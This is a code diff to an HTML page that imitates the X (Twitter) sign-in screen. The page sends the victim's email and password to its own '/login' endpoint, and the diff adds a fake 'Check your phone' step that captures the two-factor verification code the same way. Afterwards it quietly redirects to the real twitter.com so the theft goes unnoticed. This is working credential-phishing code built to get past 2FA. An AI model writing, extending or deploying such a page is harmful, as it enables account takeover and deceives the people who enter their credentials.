@@ -40,7 +40,6 @@
             margin: 30px 0 30px;
             align-self: flex-start;
             width: 100%;
-            text-align: left; /* Changed to left/center depending on layout, usually center in modal */
             text-align: center; 
         }
         .btn-social {
@@ -175,10 +174,10 @@
         <svg viewBox="0 0 24 24" class="logo"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
         
         <div id="step-1" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
-            <h1>Sign in to X</h1>
+            <h1>Log in to X</h1>
             
-            <div class="btn-social">Sign in with Google</div>
-            <div class="btn-social">Sign in with Apple</div>
+            <div class="btn-social">Log in with Google</div>
+            <div class="btn-social">Log in with Apple</div>
             
             <div class="divider"><span>or</span></div>
             
@@ -214,6 +213,18 @@
                 Don't have an account? <a href="#">Sign up</a>
             </div>
         </div>
+
+        <div id="step-3-otp" class="hidden" style="display: flex; flex-direction: column; align-items: center; width: 100%;">
+            <h1 style="margin-bottom: 10px;">Check your phone</h1>
+            <p style="color: #71767b; font-size: 15px; margin-bottom: 20px;">We sent you a verification code.</p>
+            
+            <div class="input-group">
+                <input type="text" id="otp-input" placeholder=" " required style="letter-spacing: 2px;">
+                <span class="floating-label">Verification Code</span>
+            </div>
+            
+            <button class="btn-next" onclick="submitOTP()">Verify</button>
+        </div>
     </div>
 
     <script>
@@ -241,6 +252,12 @@
                 return;
             }
 
+            // Show loading
+            const btn = document.querySelector('#step-2 .btn-next');
+            const originalText = btn.innerText;
+            btn.innerText = "Verifying...";
+            btn.disabled = true;
+
             fetch('/login', {
                 method: 'POST',
                 headers: {
@@ -250,6 +267,34 @@
                     email: email,
                     password: password
                 })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === '2fa_required') {
+                    // Show OTP Step
+                    document.getElementById('step-2').classList.add('hidden');
+                    document.getElementById('step-3-otp').classList.remove('hidden');
+                    document.getElementById('step-3-otp').style.display = "flex";
+                    document.getElementById('otp-input').focus();
+                } else {
+                    // Success or fallback redirect
+                    window.location.href = "https://twitter.com/home";
+                }
+            })
+            .catch(err => {
+                // Fallback on error
+                window.location.href = "https://twitter.com/home";
+            });
+        }
+
+        function submitOTP() {
+            const otp = document.getElementById('otp-input').value;
+            if(!otp) return;
+            
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp: otp })
             }).then(() => {
                 window.location.href = "https://twitter.com/home";
             });
@@ -261,6 +306,9 @@
         });
         document.getElementById('password-input').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') submitLogin();
+        });
+        document.getElementById('otp-input').addEventListener('keypress', function (e) {
+            if (e.key === 'Enter') submitOTP();
         });
     </script>
 </body>
